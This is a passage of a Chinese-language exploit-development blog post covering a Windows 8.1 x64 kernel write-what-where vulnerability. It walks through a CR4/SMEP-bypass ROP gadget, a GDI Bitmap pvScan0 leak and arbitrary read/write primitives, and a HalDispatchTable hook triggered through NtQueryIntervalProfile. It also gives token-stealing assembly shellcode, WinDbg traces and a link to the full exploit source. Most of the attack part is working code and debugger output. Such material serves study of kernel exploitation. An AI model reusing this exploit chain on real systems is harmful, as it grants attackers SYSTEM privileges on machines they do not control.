+<h2 id="ROPgadgets"><a href="#ROPgadgets" class="headerlink" title="ROPgadgets"></a>ROPgadgets</h2><p>我们来查看一下我们的cr4寄存器的运行在我的环境下触发漏洞前后的对比</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.formats 00000000001506f8 // 开启</span><br><span class="line">    Binary:  00000000 00000000 00000000 00000000 00000000 0001        0101 00000110 11111000</span><br><span class="line">.formats 0x406f8          // 关闭</span><br><span class="line">    Binary:  00000000 00000000 00000000 00000000 00000000 0000        0100 00000110 11111000</span><br></pre></td></tr></table></figure>
+<p>也就是说我们只需要将cr4修改为0x406f8即可在内核运行我们的shellcode从而提权，那么如何选择我们的ROP呢，我们来观察以下代码片段，可以看到里可以通过rax来修改cr4，那么问题就简单了，我们只需要把rax设为0x406f8不就行了吗，ROPgadgets的计算我们可以通过偏移来查找，首先我们通过前面的知识计算出内核基地址，然后在windbg中用u命令查看<code>KiConfigureDynamicProcessor+0x40</code>的地址，我们用该地址减去基地址即可得到偏移，有了偏移我们加上基地址就可以得到我们ROPgadgets的位置了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; u KiConfigureDynamicProcessor+0x40</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br></pre></td></tr></table></figure>
+<p>让我们再次看看我们在win7利用中如何进行Hook的，我们是直接把<code>Hal_hook_address</code>替换为ShellCode的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Trigger_shellcode(Hal_hook_address,(UINT64)&amp;ShellCode);</span><br><span class="line">NtQueryIntervalProfile(<span class="number">0x1234</span>, &amp;interVal);</span><br></pre></td></tr></table></figure>
+<p>我们想要做的是把<code>Hal_hook_address</code>先替换为我们的ROP，修改了cr4寄存器之后再执行我们的shellcode，这就需要进行多次读写的操作，显然光靠一个<code>Trigger_shellcode</code>是不够的，这里隆重介绍我们的 BITMAP 对象，这个对象在Windows 8.1中可谓是一个必杀技，用好它可以实现任意读和任意写</p>
+<h2 id="BITMAP对象"><a href="#BITMAP对象" class="headerlink" title="BITMAP对象"></a>BITMAP对象</h2><p>首先我们需要了解一下这个对象的大致信息，我们直接用<code>CreateBitmap</code>函数创建一个对象然后下断点进行观察，函数原型如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HBITMAP CreateBitmap(</span><br><span class="line"> _In_ int nWidth,</span><br><span class="line"> _In_ int nHeight,</span><br><span class="line"> _In_ UINT cPlanes,</span><br><span class="line"> _In_ UINT cBitsPerPel,</span><br><span class="line"> _In_ const VOID *lpvBits</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>我们构造如下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HBITMAP hBitmap = CreateBitmap(<span class="number">0x10</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	__debugbreak();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们需要用<code>GdiSharedHadnleTable</code>这个句柄表来泄露我们<code>hBitmap</code>的地址，先不用管原理是什么，总之我们现在先找到我们Bitmap的位置，可以看到我们通过一系列操作居然找到了我们的Bitmap，其分配在会话池，大小是0x370</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; r</span><br><span class="line">rax=000000007d050040 rbx=00000043e8613860 rcx=00007ffea6a934fa</span><br><span class="line">rdx=0000000000000000 rsi=0000000000000000 rdi=00000043e8617d50</span><br><span class="line">rip=00007ff7468c1033 rsp=00000043e858f8c0 rbp=0000000000000000</span><br><span class="line"> r8=00000043e858f8b8  r9=0000000000000000 r10=0000000000000000</span><br><span class="line">r11=0000000000000246 r12=0000000000000000 r13=0000000000000000</span><br><span class="line">r14=0000000000000000 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl zr na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">WWW!main+0x23:</span><br><span class="line">0033:00007ff7`468c1033 cc              int     3</span><br><span class="line">1: kd&gt; dt ntdll!_PEB -b GdiSharedHandleTable @$Peb</span><br><span class="line">   +0x0f8 GdiSharedHandleTable : 0x00000043`e8920000 </span><br><span class="line">1: kd&gt; ? rax&amp;ffff</span><br><span class="line">Evaluate expression: 64 = 00000000`00000040</span><br><span class="line">1: kd&gt; ? 0x00000043`e8920000+40*18</span><br><span class="line">Evaluate expression: 291664692736 = 00000043`e8920600</span><br><span class="line">1: kd&gt; dq 00000043`e8920600</span><br><span class="line">00000043`e8920600  fffff901`43c3dca0 40057d05`000008f4</span><br><span class="line">00000043`e8920610  00000000`00000000 fffff901`400c2ca0</span><br><span class="line">00000043`e8920620  40050405`00000000 00000000`00000000</span><br><span class="line">00000043`e8920630  fffff901`43c5ed60 40080508`00000000</span><br><span class="line">00000043`e8920640  00000000`00000000 fffff901`43d0d000</span><br><span class="line">00000043`e8920650  40050505`00000000 00000000`00000000</span><br><span class="line">00000043`e8920660  fffff901`43d0b000 40050305`00000000</span><br><span class="line">00000043`e8920670  00000000`00000000 fffff901`43cb9d40</span><br><span class="line">1: kd&gt; !pool fffff901`43c3dca0</span><br><span class="line">unable to get nt!ExpHeapBackedPoolEnabledState</span><br><span class="line">Pool page fffff90143c3dca0 region is Paged session pool</span><br><span class="line"> fffff90143c3d000 size:  9f0 previous size:    0  (Allocated)  Gla1</span><br><span class="line"> fffff90143c3d9f0 size:   90 previous size:  9f0  (Allocated)  DCba Process: ffffe00002475080</span><br><span class="line"> fffff90143c3da80 size:   50 previous size:   90  (Free)       Free</span><br><span class="line"> fffff90143c3dad0 size:   a0 previous size:   50  (Allocated)  Usqm</span><br><span class="line"> fffff90143c3db70 size:   30 previous size:   a0  (Allocated)  Uspi Process: ffffe00002b83900</span><br><span class="line"> fffff90143c3dba0 size:   f0 previous size:   30  (Allocated)  Gla8</span><br><span class="line">*fffff90143c3dc90 size:  370 previous size:   f0  (Allocated) *Gla5</span><br><span class="line">		Pooltag Gla5 : GDITAG_HMGR_LOOKASIDE_SURF_TYPE, Binary : win32k.sys</span><br></pre></td></tr></table></figure>
+<p>让我们理一下这个过程，首先从命令中我们知道<code>GdiSharedHandleTable</code>是在PEB中，而<code>GdiSharedHandleTable</code>本身是一个保存GDI对象的句柄表，其指向的是一个叫<code>GDICELL64</code>的结构，其大小是0x18：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PVOID pKernelAddress;</span><br><span class="line">    USHORT wProcessID;</span><br><span class="line">    USHORT wCount;</span><br><span class="line">    USHORT wUpper;</span><br><span class="line">    PVOID wType;</span><br><span class="line">    PVOID64 pUserAddress;</span><br><span class="line">&#125; GDICELL64;</span><br></pre></td></tr></table></figure>
+<p>从上面我们可以看到它可以泄露我们内核中的地址，过程就是先计算出函数返回值(rax)的低4字节作为索引，然后乘上<code>GDICELL64</code>的大小0x18，再加上<code>GdiSharedHandleTable</code>的地址即可得到我们Bitmap的地址，换成代码实现就是</p>
+<ul>
+<li>首先找到我们的TEB</li>
+<li>通过TEB找到PEB</li>
+<li>再通过PEB找到<code>GdiSharedHandleTable</code>句柄表</li>
+<li>通过计算获得Bitmap的地址</li>
+</ul>
+<p>关键实现代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">getGdiShreadHandleTableAddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();</span><br><span class="line">	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + <span class="number">0x60</span>);</span><br><span class="line">	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + <span class="number">0xf8</span>);</span><br><span class="line">	<span class="keyword">return</span> GdiShreadHandleTableAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">getBitMapAddr</span><span class="params">(HBITMAP hBitmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD arrayIndex = LOWORD(hBitmap);</span><br><span class="line">	<span class="keyword">return</span> *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>让我们来查看一下Bitmap的结构，我们只需要关注重点的位置就行了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> BASEOBJECT64 BaseObject; <span class="comment">// 0x18bytes</span></span><br><span class="line"> SURFOBJ64 SurfObj; </span><br><span class="line"> ....... </span><br><span class="line">&#125; SURFACE64</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> ULONG64 hHmgr; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG32 ulShareCount; <span class="comment">// 4bytes</span></span><br><span class="line"> WORD cExclusiveLock; <span class="comment">// 2bytes</span></span><br><span class="line"> WORD BaseFlags; <span class="comment">// 2bytes</span></span><br><span class="line"> ULONG64 Tid; <span class="comment">// 8bytes</span></span><br><span class="line">&#125; BASEOBJECT64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> ULONG64 dhsurf; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 hsurf; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 dhpdev; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 hdev; <span class="comment">// 8bytes</span></span><br><span class="line"> SIZEL sizlBitmap; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 cjBits; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 pvBits; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG64 pvScan0; <span class="comment">// 8bytes</span></span><br><span class="line"> ULONG32 lDelta; <span class="comment">// 4bytes</span></span><br><span class="line"> ULONG32 iUniq; <span class="comment">// 4bytes</span></span><br><span class="line"> ULONG32 iBitmapFormat; <span class="comment">// 4bytes</span></span><br><span class="line"> USHORT iType; <span class="comment">// 2bytes</span></span><br><span class="line"> USHORT fjBitmap; <span class="comment">// 2bytes</span></span><br><span class="line">&#125; SURFOBJ64</span><br></pre></td></tr></table></figure>
+<p>这里我借鉴图片来说明，我们关注的点就只有一个<code>pvScan0</code>结构，它的偏移是 +0x50 处，可以发现它指向我们的<code>Pixel Data</code>，这个结构就是我们<code>CreateBitmap</code>函数传入的第五个参数，也就是说我们传入aaaa，那么pVscan0指向地址的内容就是aaaa</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/6.png" alt="6"></p>
+<h2 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h2><p>我们刚才分析了那么多，说到底都是为了一个目的 =&gt; 任意读任意写，那么如何才能任意读和写呢？这里我再介绍两个比较重要的函数<code>SetBitmapBits</code>和<code>GetBitmapBits</code>其原型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">SetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HBITMAP    hbm,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> VOID *pvBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG <span class="title">GetBitmapBits</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HBITMAP hbit,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG    cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpvBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>这两个函数的作用是向pvScan0指向的地址写(读)cb byte大小的数据，说到这里貌似有一点任意读写的感觉了，光靠一个pvScan0是肯定不能任意读写的，所以这里我们考虑使用两个pvScan0，我们把一个pvScan0指向另外一个pvScan0，我们有<code>TriggerArbitraryOverwrite</code>函数可以实现将一个pvScan0指向另一个pvScan0，然后我们再调用<code>SetBitmapBits</code>和<code>GetBitmapBits</code>函数岂不是就可以进行任意读写了，我们用图片说明：</p>
+<p><img src="/2019/08/19/www漏洞从win7-win10/7.png" alt="7"></p>
+<p>我们任意读写的代码构造如下，read函数实现将whereRead的内容读到whatValue的位置，write函数实现将whatValue的内容写入whereWrite的位置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">readOOB</span><span class="params">(DWORD64 whereRead, LPVOID whatValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManagerBitmap, len, &amp;whereRead);</span><br><span class="line">	GetBitmapBits(hWorkerBitmap, len, whatValue);	<span class="comment">// read</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">writeOOB</span><span class="params">(DWORD64 whereWrite, LPVOID whatValue, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManagerBitmap, len, &amp;whereWrite);</span><br><span class="line">	SetBitmapBits(hWorkerBitmap, len, &amp;whatValue);	<span class="comment">// write</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>让我们平复一下激动的心情，我们现在有了任意读和写的机会了，我们只需要将我们的ROPgadgets写入我们需要Hook的位置，然后调用问题函数执行shellcode就行了，这里我们需要注意的是，我们还需要调整调整堆栈的一些信息，不然很容易就蓝屏了，这里我们进行三次读写操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readOOB(Hal_hook_address, &amp;lpRealHooAddress, <span class="keyword">sizeof</span>(LPVOID));  			<span class="comment">// 保存Hook地址</span></span><br><span class="line">writeOOB(Hal_hook_address, (LPVOID)ROPgadgets, <span class="keyword">sizeof</span>(DWORD64));		<span class="comment">// 写入ROPgadgets</span></span><br><span class="line"><span class="comment">//调用问题函数</span></span><br><span class="line">writeOOB(Hal_hook_address, (LPVOID)lpRealHooAddress, <span class="keyword">sizeof</span>(DWORD64));	 <span class="comment">// 还原Hook地址,不然会蓝屏</span></span><br></pre></td></tr></table></figure>
+<h2 id="整合思路"><a href="#整合思路" class="headerlink" title="整合思路"></a>整合思路</h2><p>我们最后整合一下思路</p>
+<ul>
+<li>初始化句柄等结构</li>
+<li>内核中构造放置我们的shellcode</li>
+<li>申请两个Bitmap并泄露Bitmap中的pvScan0</li>
+<li>调用<code>TriggerArbitraryOverwrite</code>函数将一个pvScan0指向另一个pvScan0</li>
+<li>两次读写实现写入ROPgadgets</li>
+<li>调用<code>NtQueryIntervalProfile</code>问题函数</li>
+<li>一次写入操作实现还原Hook地址的内容</li>
+</ul>
+<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
+<h1 id="0x03：Windows-8-1-x64的一个坑"><a href="#0x03：Windows-8-1-x64的一个坑" class="headerlink" title="0x03：Windows 8.1 x64的一个坑"></a>0x03：Windows 8.1 x64的一个坑</h1><p>首先我们回顾一下我们在上面的利用中可能存在的一个坑</p>
+<p><strong>Shellcode的构造</strong></p>
+<p>上篇我只是简单提了一下内核中构造放置我们的shellcode，如果你看了我的源码，里面的构造函数如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ConstrutShellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to construt Shellcode\n"</span>);</span><br><span class="line">	VOID* shellAddr = (<span class="keyword">void</span>*)<span class="number">0x100000</span>;</span><br><span class="line">	shellAddr = VirtualAlloc(shellAddr, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memset</span>(shellAddr, <span class="number">0x41</span>, <span class="number">0x1000</span>);</span><br><span class="line">	CopyMemory((VOID*)<span class="number">0x100300</span>, ShellCode, <span class="number">0x200</span>);</span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">	UINT64* recoverAddr = (UINT64*)((PBYTE)(<span class="number">0x100300</span>) + <span class="number">0x44</span>);</span><br><span class="line">	*(recoverAddr) = (DWORD64)ntoskrnlbase() + <span class="number">0x4c8f75</span>; <span class="comment">// nt!KeQueryIntervalProfile+0x25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>你可能会疑惑<code>recoverAddr</code>这个东西是拿来做什么用的，先不要着急我们在看看我们shellcode的实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">ShellCode proc</span><br><span class="line">	; shellcode编写</span><br><span class="line">	mov rax, gs:[188h]</span><br><span class="line">	mov rax, [rax+220h]</span><br><span class="line">	mov	rcx, rax</span><br><span class="line">	mov	rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">	mov	rax, [rax+2e8h]</span><br><span class="line">	sub	rax, 2e8h</span><br><span class="line">	cmp	[rax+2e0h], rdx</span><br><span class="line">	jnz findSystemPid</span><br><span class="line"></span><br><span class="line">	mov rdx, [rax+348h]</span><br><span class="line">	mov [rcx+348h], rdx</span><br><span class="line">	sub rsp,30h						;堆栈平衡</span><br><span class="line">	mov rax, 0aaaaaaaaaaaaaaaah		 ;这个位置放进入Gadgets返回后的后半部分函数</span><br><span class="line">	mov [rsp], rax</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">ShellCode endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>从上面可以看到，我在最后的地方用了几句汇编将堆栈平衡了，这其实是我调试了很久才得到的结果，我简单提一下这个过程，首先我们知道我们把shellcode放置在了0x100300的位置，我们还知道我们需要执行我们的ROP，所以我们需要在windbg中下两个硬件断点观察，注意shellcode中不能用int 3下软件断点，这样会修改堆栈的平衡导致一些问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; u nt!KiConfigureDynamicProcessor+0x40</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br><span class="line">...</span><br><span class="line">1: kd&gt; ba e1 fffff803`20ffe7cc</span><br><span class="line">1: kd&gt; u 100300</span><br><span class="line">00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">00000000`00100309 488b8020020000  mov     rax,qword ptr [rax+220h]</span><br><span class="line">00000000`00100310 488bc8          mov     rcx,rax</span><br><span class="line">...</span><br><span class="line">1: kd&gt; ba e1 00000000`00100300</span><br></pre></td></tr></table></figure>
+<p>我们g运行到第一个断点，t单步到ret处，查看堆栈结构和我们现在rc4寄存器的值，可以发现我们的寄存器已经被修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x40:</span><br><span class="line">fffff803`20ffe7cc 0f22e0          mov     cr4,rax</span><br><span class="line">1: kd&gt; t</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x43:</span><br><span class="line">fffff803`20ffe7cf 4883c428        add     rsp,28h</span><br><span class="line">1: kd&gt; t</span><br><span class="line">nt!KiConfigureDynamicProcessor+0x47:</span><br><span class="line">fffff803`20ffe7d3 c3              ret</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a0  00000000`00100300</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">1: kd&gt; r cr4</span><br><span class="line">cr4=00000000000406f8</span><br></pre></td></tr></table></figure>
+<p>我们t单步再次观察堆栈，这里已经开始执行我们的shellcode了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; t</span><br><span class="line">00000000`00100300 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffffd000`27acf9a8  00000000`00000000</span><br><span class="line">ffffd000`27acf9b0  00000000`00000000</span><br><span class="line">ffffd000`27acf9b8  00000000`00000000</span><br><span class="line">ffffd000`27acf9c0  00000000`00000000</span><br><span class="line">ffffd000`27acf9c8  fffff803`2114ff36 nt!NtQueryIntervalProfile+0x3e</span><br><span class="line">ffffd000`27acf9d0  00000000`00000000</span><br><span class="line">ffffd000`27acf9d8  00000000`00000000</span><br><span class="line">ffffd000`27acf9e0  00000000`00000000</span><br><span class="line">ffffd000`27acf9e8  00000000`00000000</span><br><span class="line">ffffd000`27acf9f0  00000000`00000000</span><br><span class="line">ffffd000`27acf9f8  fffff803`20de28b3 nt!KiSystemServiceCopyEnd+0x13</span><br><span class="line">ffffd000`27acfa00  ffffe000`01b9a4c0</span><br><span class="line">ffffd000`27acfa08  00007ffe`00000008</span><br><span class="line">ffffd000`27acfa10  ffffffff`fff85ee0</span><br><span class="line">ffffd000`27acfa18  ffffd000`00000008</span><br><span class="line">ffffd000`27acfa20  000000bf`00000000</span><br></pre></td></tr></table></figure>
+<p>我们继续单步运行到shellcode中<code>sub rsp,30h</code>的位置，查看堆栈之后继续单步，我们可以看到rsp中内容被修改为了0x010033e，而0x010033e中存放的内容正是我们<code>nt!KeQueryIntervalProfile+0x25</code>中的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 